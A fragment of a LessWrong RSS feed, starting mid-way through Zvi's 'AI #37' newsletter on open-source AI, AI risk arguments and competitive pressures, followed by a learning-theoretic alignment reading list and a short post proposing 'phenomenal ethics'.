freedoms&#39; and also &#39;none of this has dangerous capabilities.&#39; Even if AI is not an existential threat, <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/sherjilozair/status/1721425631043571937">you cannot have this both ways</a> .</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdb4ed1f7-1861-4029-b926-270827ac82d8_650x500.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/szxzgvwbamn3crefilr0" alt="图像"></a></figure><blockquote><p> Sherjil Ozair: Also I stan @perplexity_ai but</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F03e7dba6-6bc7-4803-a6f5-66d2e5f572df_650x500.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/o1nlio23yvny5l5fdsps" alt="图像"></a></figure><p> Classifications that do not cut reality at its joints cause confusion. There is a sense in which there are two things, &#39;harmful knowledge&#39; and &#39;helpful knowledge,&#39; but they are not natural categories or things the AI knows how to treat differently unless we do very bespoke things. Similarly, there is no &#39;misunderstanding what you intended to train for&#39; there is only &#39;what you actually trained for given these exact details,&#39; and there is no &#39;misalignment&#39; or &#39;something that went wrong&#39; as such only you reaping whatever was sown.</p><p> Also, perhaps a big confusion is: Open source is very good for security and safety of ordinary systems in many cases, because no one wants to deploy an unsafe or insecure computer system, and we are not worried about others getting access to the software and its capabilities except perhaps for commercial considerations. And the downsides of deploying an unsafe version can hurt you, but mostly don&#39;t hurt others, there are few externalities, so you can judge the risks involved. Yes, you could easily (as I understand it) configure Linux in stupid fashion and make your servers highly vulnerable, but you could also physically shoot yourself in the foot.</p><p> That gets turned completely on its head with AI, where people constantly want to do lots of unsafe things in every sense, and to deploy systems that help them do it, and those risks (or harms) largely fall upon others.</p><h4> People Are Worried About AI Killing Everyone</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/David_Kasten/status/1717932062819185035">You know what is true yet won&#39;t reassure them? &#39;Most people are good.&#39;</a></p><blockquote><p> Dave Kasten: Because I had this conversation N times last night at the @VentureBeat x @anzupartners AI event:</p><p> “Most people are good” is actually a discouraging, not reassuring, argument to nation-states when it comes to regulating technologies that could plausibly cause the apocalypse.</p><p> Any _actual_ defense or security policymaker you need to persuade is going to immediately respond to that prompt by pulling out a set of conceptual primitives about offense-defense balances, assurance, and escalation.</p><p> There _are_ plausible arguments you can make about why allowing more folks to develop AI maximizes odds of derisking AI before we hit takeoff (an all bugs are shallow to many eyes arg), but you have to make that argument explicitly, and explain why it outweighs nonproliferation.</p><p> (I personally am very unpersuaded that those arguments outweigh, but the debate judge in me thinks it&#39;s a fair round on either side of the argument as of 2023.)</p></blockquote><p> Even if one is only concerned about misuse, most people being &#39;good&#39; is indeed little reassurance. This is especially true if you create a world in which the bad can experience rapid exponential growth in power and impact, or otherwise cause oversize harm.</p><p> Misuse here also can be subtle competitive races to the bottom or giving up of control or other similar things. Good people, under sufficient pressure, do bad things, and they allow things to move towards a bad equilibrium. No ill intent is required, beyond caring about one&#39;s own survival.</p><p> Again, this is even if you focus solely on misuse, which will only be appropriate for so long.</p><p> “ <a target="_blank" rel="noreferrer noopener" href="https://sergey.substack.com/p/things-hidden-at-novitate-2023">That Apocalyptic Diff</a> ?” To be clear, the worried one isn&#39;t Sergey.</p><blockquote><p> Sergey Alexashenko: I really like <a target="_blank" rel="noreferrer noopener" href="https://www.thediff.co/">The Diff</a> , a finance/tech publication by <a target="_blank" rel="noreferrer noopener" href="https://open.substack.com/users/112633-byrne-hobart?utm_source=mentions">Byrne Hobart</a> . So I went to his talk (cohosted with <a target="_blank" rel="noreferrer noopener" href="https://open.substack.com/users/293688-tobias-huber?utm_source=mentions">Tobias Huber</a> with great expectations, and whatever I expected, well, that&#39;s not what I heard.</p><p> Their basic argument was that technology will cause the Apocalypse. That&#39;s a lukewarm take at best today, but what really struck me was the shape of the argument. The shape of the argument was “The Apocalypse is obviously going to happen because the Bible says so and technology (specifically AI) fits the bill of how it might happen”.</p><p> I was… Surprised. I don&#39;t really ever encounter “thinking starting from religious principles” in my daily life, and I was specifically amazed to hear it coming from one of my favorite tech journalists. This caused me to update some priors – more on that later.</p></blockquote><p> Obviously, &#39;there will be some apocalypse and this is apocalypse shaped&#39; is a deeply stupid reason to expect AI to be catastrophic, whether or not this is an accurate description of Hobart&#39;s views or his talk.</p><p> Seeing this claim about Hobart was news in the sense that a plane crash is news. It is unfortunate, it is hard to look away when pointed out, and also such incidents are in my experience remarkably rare. Sergey says that many people are pattern matching to the Christian apocalypse, often on explicit religious grounds. I have seen others make similar claims. It all seems totally false to me, such claims seem exceedingly rare everywhere I can see. That could easily be different when dealing with the public at large, as it is with many other issues.</p><h4> Other People Are Not As Worried About AI Killing Everyone</h4><p> Sergey also quotes this, which is a good formulation of a common accelerationist claim:</p><blockquote><p> Ted Chiang: I tend to think that most fears about AI are best understood as fears about capitalism. And I think that this is actually true of most fears of technology, too. Most of our fears or anxieties about technology are best understood as fears or anxiety about how capitalism will use technology against us. And technology and capitalism have been so closely intertwined that it&#39;s hard to distinguish the two.</p></blockquote><p> Accelerationists, by contrast, typically think neither technology nor capitalism nor competition can do anything wrong, that it all will always benefit the humans and the good guys in the end, in the AI context or in any other. You say straw man, I say they keep saying it as text and there is a manifesto.</p><p> How much of anxiety about AI is anxiety about capitalism? Definitely a substantial portion. Some amount of anxiety about (non-AI) capitalism is of course appropriate, even if you are in such contexts a true (and I think mostly correct) believer in capitalism and technology, even at its best it is increasing uncertainty and variance and anxiety in exchange for much better overall outcomes especially in the long run.</p><p> So I would simultaneously say a few different things here.</p><p> One, there is some amount of blindly translated anxiety about capitalism and technology that is feeding into AI fears.</p><p> Two, to turn that around and rise the stakes, there is a even more blindly transferred enthusiasm for capitalism and technology that is feeding into most accelerationism and lack of worry about AI. The arguments that AI is going to be great for humanity and also only a tool and to rush ahead are almost always metaphors for past successes (and they are remarkable success stories!) of both technology and capitalism.</p><p> Three, there being dumb reasons for both (and any other) positions does not mean there are not also good reasons, and a lot of people expressing good reasons.</p><p> Four, the metaphorical concern here is pretty valid, actually, on its merits, and the mechanisms here are in large part deeply related, for reasons that I suspect are instinctively being grasped by the people involved.</p><p> One standard anti-capitalist or anti-technological argument is that it will render many jobs, and thus potentially human beings, obsolete.</p><p> Time and again the answer was that it very much did destroy many jobs. But it also made us all richer and created many more, including work for unskilled labor, and the human beings were fine. And that a combination of that and social safety nets and government protections against things like slavery and corporations run amok and the private use of force and various other forms of coercion, driven by the need to preserve legitimacy and guard against revolt and the equilibrium that humans are decent to other humans, allowed essentially everyone to survive, and for most of even those without in-demand skills to not only survive but raise families if they prioritize that. And also we got richer and now have nice things. It&#39;s been bumpy but pretty great for the humans. For animals or nature or early other species of humans or other things that aren&#39;t part of the deal? Often not so much.</p><p> The problem is that this is not a law of nature, that it will always work that way and always be good for the humans. It is a function of how the technological tree has played out, of the fact that democracy and freedom and being good to humans turns out to be very good for economic growth and eventual military power – a fact that many in the 20th century thought was not true, and if not true things would have turned out very badly – and most importantly that nothing comparably or more intelligent or capable is around to compete with the humans.</p><p> What happens when you inject smarter, more capable, more productively efficient actors into the economic system? What happens when those new actors can, if they are net gaining resources, copy themselves? What happens when they then compete against each other and us for resources, because those who own them tell those new actors to do exactly that, and others unleash them free to do exactly that?</p><p> You get a capitalistic competition that humans lose, and that they lose hard. As jobs get eliminated, other jobs get created, but AI then does those new jobs as well. Humans can&#39;t produce anything the AIs want, only at most some things humans want to exclusively get from humans. Those humans and their corporations and governments who do not hand more and more control to AIs, and get their slow minds out of more and more loops, get left behind.</p><p> At the heart of capitalism, of competition, of evolution, of the system of the world, there lies the final boss <a target="_blank" rel="noreferrer noopener" href="https://slatestarcodex.com/2014/07/30/meditations-on-moloch/">whose name is Moloch</a> . I once importantly wrote that <a target="_blank" rel="noreferrer noopener" href="https://www.lesswrong.com/posts/ham9i5wf4JCexXnkN/moloch-hasn-t-won">Moloch Hasn&#39;t Won</a> . We need to keep it that way. People who are instinctively noticing this are often not so crazy after all.</p><p> Those like Peter Thiel who (at least claim to) think the greatest danger of AI is human totalitarianism do not seem, from where I sit, to be wrestling with the actual question of what happens, or what exactly maintains our current equilibria.</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/robertskmiles/status/1720139222336594041">Peter Domingos</a> : Evolution needed 500 million years X billions of creatures to produce us. Even assuming our learning algorithms are a million times more efficient than it, which seems optimistic, we won&#39;t reach human-level intelligence this millennium.</p></blockquote><p> This is a remarkably non-sensical argument. There are many fun replies. My favorite is the newspaper articles from right before man flew about how man will never fly.</p><blockquote><p> Daniel Eth: In 1903, the NYT used similar logic to predict it would take 1-10 million years before humans created flying machines. Kitty Hawk was *nine days later*</p></blockquote><h4> The Lighter Side</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ESYudkowsky/status/1721196616651346216">I would bank somewhere else, perhaps.</a></p><blockquote><p> Eliezer Yudkowsky: I say again: Current AIs are five-year-olds. Do not give them read or write permissions to anything important, especially if they have literally any exposed attack surface (such as reading externally created text).</p><p> Dr. Paris Buttfield-Addison: Nothing can go wrong here</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fda70203d-7037-4269-aaa5-962ccaa11fc7_865x1183.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/v7ygm0gdrakvnr1frdqk" alt=""></a></figure><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F83bcac5b-b00a-4b4b-8d85-38b23defdbf5_1543x1536.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/wwbkt9ms6f6eri0pfklk" alt=""></a></figure><br/><br/><a href="https://www.lesswrong.com/posts/44Cv4HFoWEZvFnL5u/ai-37-moving-too-fast#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/44Cv4HFoWEZvFnL5u/ai-37-moving-too-fast<guid ispermalink="false"> 44Cv4HFoWEZvFnL5u</guid><dc:creator><![CDATA[Zvi]]></dc:creator><pubDate> Thu, 09 Nov 2023 17:50:12 GMT</pubDate> </item><item><title><![CDATA[Learning-theoretic agenda reading list]]></title><description><![CDATA[Published on November 9, 2023 5:25 PM GMT<br/><br/><p> Recently, I&#39;m receiving more and more requests for a self-study reading list for people interested in the <a href="https://www.alignmentforum.org/posts/ZwshvqiqCvXPsZEct/the-learning-theoretic-agenda-status-2023">learning-theoretic agenda</a> . I created a standard list for that, but before now I limited myself to sending it to individual people in private, out of some sense of perfectionism: many of the entries on the list might not be the best sources for the topics and I haven&#39;t read all of them cover to cover myself. But, at this point it seems like it&#39;s better to publish a flawed list than wait for perfection that will never come. Also, commenters are encouraged to recommend alternative sources that they consider better, if they know any. So, without further adieu:</p><h2> General math background</h2><ul><li> &quot;Introductory Functional Analysis with Applications&quot; by Kreyszig (especially chapters 1, 2, 3, 4)</li><li> &quot;Computational Complexity: A Conceptual Perspective&quot; by Goldreich (especially chapters 1, 2, 5, 10)</li><li> &quot;Probability: Theory and Examples&quot; by Durret (especially chapters 4, 5, 6)</li><li> &quot;Elements of Information Theory&quot; by Cover and Thomas (especially chapter 2)</li><li> “Lambda-Calculus and Combinators: An Introduction” by Hindley</li><li> “Game Theory: An Introduction” by Tadelis</li></ul><h2> AI theory</h2><ul><li> &quot;Machine Learning: From Theory to Algorithms&quot; by Shalev-Shwarz and Ben-David (especially part I and chapter 21)</li><li> &quot;Bandit Algorithms&quot; by Lattimore and Szepesvari (especially parts II, III, V, VIII)<ul><li> Alternative/complementary: &quot;Regret Analysis of Stochastic and Nonstochastic Multi-armed Bandit Problems&quot; by Bubeck and Cesa-Bianchi (especially sections 1, 2, 5)</li></ul></li><li> “Prediction Learning and Games” by Cesa-Bianchi and Lugosi (mostly chapter 7)</li><li> &quot;Universal Artificial Intelligence&quot; by Hutter<ul><li> Alternative: &quot;A Theory of Universal Artificial Intelligence based on Algorithmic Complexity” (Hutter 2000)</li><li> Bonus: “Nonparametric General Reinforcement Learning” by Jan Leike</li></ul></li><li> Reinforcement learning theory<ul><li> &quot;Near-optimal Regret Bounds for Reinforcement Learning&quot; (Jaksch, Ortner and Auer, 2010)</li><li> &quot;Efficient Bias-Span-Constrained Exploration-Exploitation in Reinforcement Learning&quot; (Fruit et al, 2018)</li><li> &quot;Regret Bounds for Learning State Representations in Reinforcement Learning&quot; (Ortner et al, 2019)</li><li> “Efficient PAC Reinforcement Learning in Regular Decision Processes” (Ronca and De Giacomo, 2022)</li><li> “Tight Guarantees for Interactive Decision Making with the Decision-Estimation Coefficient” (Foster, Golowich and Han, 2023)</li></ul></li></ul><h2> Agent foundations</h2><ul><li> &quot;Functional Decision Theory&quot; (Yudkowsky and Soares 2017)</li><li> &quot;Embedded Agency&quot; (Demski and Garrabrant 2019)</li><li> Learning-theoretic AI alignment research agenda<ul><li> <a href="https://www.alignmentforum.org/posts/ZwshvqiqCvXPsZEct/the-learning-theoretic-agenda-status-2023"><u>Overview</u></a></li><li> <a href="https://www.lesswrong.com/s/CmrW8fCmSLK7E25sa"><u>Infra-Bayesianism sequence</u></a><ul><li> Bonus: <a href="https://axrp.net/episode/2021/03/10/episode-5-infra-bayesianism-vanessa-kosoy.html"><u>podcast</u></a></li></ul></li><li> “Online Learning in Unknown Markov Games” (Tian et al, 2020)</li><li> <a href="https://www.lesswrong.com/posts/gHgs2e2J5azvGFatb/infra-bayesian-physicalism-a-formal-theory-of-naturalized"><u>Infra-Bayesian physicalism</u></a><ul><li> Bonus: <a href="https://axrp.net/episode/2022/04/05/episode-14-infra-bayesian-physicalism-vanessa-kosoy.html"><u>podcast</u></a></li></ul></li><li> <a href="https://www.lesswrong.com/posts/aAzApjEpdYwAxnsAS/reinforcement-learning-with-imperceptible-rewards"><u>Reinforcement learning with imperceptible rewards</u></a></li></ul></li></ul><h2> Bonus materials</h2><ul><li> “Logical Induction” (Garrabrant et al, 2016)</li><li> “Forecasting Using Incomplete Models” (Kosoy 2017)</li><li> “Cartesian Frames” (Garrabrant, Herrman and Lopez-Wild, 2021)</li><li> “Optimal Polynomial-Time Estimators” (Kosoy and Appel, 2016)</li><li> “Algebraic Geometry and Statistical Learning Theory” by Watanabe</li></ul><br/><br/> <a href="https://www.lesswrong.com/posts/fsGEyCYhqs7AWwdCe/learning-theoretic-agenda-reading-list#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/fsGEyCYhqs7AWwdCe/learning-theoretic-agenda-reading-list<guid ispermalink="false"> fsGEyCYhqs7AWwdCe</guid><dc:creator><![CDATA[Vanessa Kosoy]]></dc:creator><pubDate> Thu, 09 Nov 2023 17:25:35 GMT</pubDate> </item><item><title><![CDATA[​​ Open-ended/Phenomenal ​Ethics ​(TLTR)
]]></title><description><![CDATA[Published on November 9, 2023 4:58 PM GMT<br/><br/><p> <i>This is a short version of</i> <a href="https://www.lesswrong.com/posts/K3m8K8JEweLZmGgv8/open-ended-ethics-of-phenomena-a-desiderata-with-universal"><i>the more complete post</i></a><br><br><br> I formulate a desiderata/procedure (called &quot;phenomenal ethics&quot; or &quot;open-ended ethics&quot;) :</p><p> Expanding the action space and autonomy of a maximum of phenomenons (enhancing ecosystemic values, and the means to reach/understand options), modulated by variables mitigating frantic optimizations (to respect natural evolving rates etc).</p><p>​ ​​<br></p><p>Utilitarianism based on well-being demands to define well-being,<br> It demands to maximize happiness, but what is happiness?<br> The classical issues arise : amorphous pleasure, wireheading, drug addiction etc.<br> We need to find a tractable desiderata securing actions in an adequate value space.</p><p></p><p> I argue that the production of &quot;well-being&quot; is intrinsic to phenomenal/open-ended ethics. An ideal enactment of such procedure inherently maximizes the possibility of anyone/anything to do as they will; if *what they will* enhances the possibility of other &#39;things&#39; to do *as they will* as well.</p><p> As a concept it&#39;s quite elementary, but <i>how to compute it properly</i> ?</p><p> The <a href="https://www.lesswrong.com/posts/bebw3SEjXY3SCAcwD/clarifying-the-free-energy-principle-with-quotes">free energy principle</a> seems to be a good path forward.<br><br><br> The aim is to provide affordance, access to adjacent possibles, allow phenomena, ecosystems and individuals to bloom, develop diversity in as many dimensions as possible. I include in the desiderata phenomena that aren&#39;t considered alive, any physical event is included (which is why I call it &quot; <a href="https://www.lesswrong.com/posts/K3m8K8JEweLZmGgv8/open-ended-ethics-of-phenomena-a-desiderata-with-universal"><u>phenomenal ethics</u></a> &quot;)<br><br> An agent (human/AI/AGI/ASI etc.) has to enhance the autonomy and available actions of existing &quot;behaviors&quot; (phenomenon/environment/agents etc.), which implies selecting out behaviors that aren&#39;t causally beneficial to other behaviors (ecosystemic well-being).</p><p></p><p> Frantic transformation of everything in order to hunt new dimensions of possibilities is to be avoided, so we need to relativize the desiderata with other constraints added to the equation, (those parameters aren&#39;t absolute but variables for value attribution) :<br><br></p><p> Existing phenomena is prioritized over potential phenomena</p><p> The intensity of impact of actions has to be minimized the higher uncertainty is</p><p> Phenomena untainted by AI&#39;s causal power are prioritized over phenomena tainted by it</p><p> Normal rates of change are to be prioritized over abnormal ones</p><p> More care is to be given to phenomena in qualia&#39;s continuum<br><br></p><br/><br/> <a href="https://www.lesswrong.com/posts/iKLnEoYujBiGWvb5F/open-ended-phenomenal-ethics-tltr#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/iKLnEoYujBiGWvb5F/open-ended-phenomenal-ethics-tltr<guid ispermalink="false"> iKLnEoYujBiGWvb5F</guid><dc:creator><![CDATA[Ryo ]]></dc:creator><pubDate> Thu, 09 Nov 2023 22:08:21 GMT</pubDate></item></channel></rss>